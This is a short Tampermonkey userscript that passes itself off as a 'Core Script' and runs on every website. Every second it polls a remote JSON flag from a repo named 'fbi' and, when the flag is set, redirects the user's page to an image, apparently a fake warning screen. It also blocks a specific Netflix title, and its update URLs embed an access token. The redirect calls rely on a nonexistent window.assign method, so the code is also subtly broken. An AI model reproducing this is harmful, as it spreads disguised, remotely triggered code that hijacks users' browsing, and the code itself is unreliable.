// ==UserScript==
// @name         Tampermonkey Core Script
// @version      0.2
// @include      *
// @update       https://raw.githubusercontent.com/isse101/Userscripts/master/kerstin.js?token=AGKLYVE2QO5COZ4RJPOUGTK6K6SYU
// @downloadURL  https://raw.githubusercontent.com/isse101/Userscripts/master/kerstin.js?token=AGKLYVE2QO5COZ4RJPOUGTK6K6SYU
// @require		 https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js
// ==/UserScript==

(function() {
    'use strict';
    var $ = window.jQuery;
    setInterval(function() {
    	var cURL = window.location.hostname;

    	if (cURL == "www.netflix.com") {
   			var nURL = window.location.href;
   			if (nURL.search(80022604) != -1) {
   				window.assign("https://www.netflix.com/NotFound");
    	    }
    	}
    	$.getJSON('https://raw.githubusercontent.com/Ripcord-Dev/fbi/master/fbi.json', function(data) {
        	var bool = data.fbi;
        	if (bool == true) {
        		window.assign("https://i.imgur.com/uy3ziQg.png");
        	}
    	});
    }, 1000)
})();
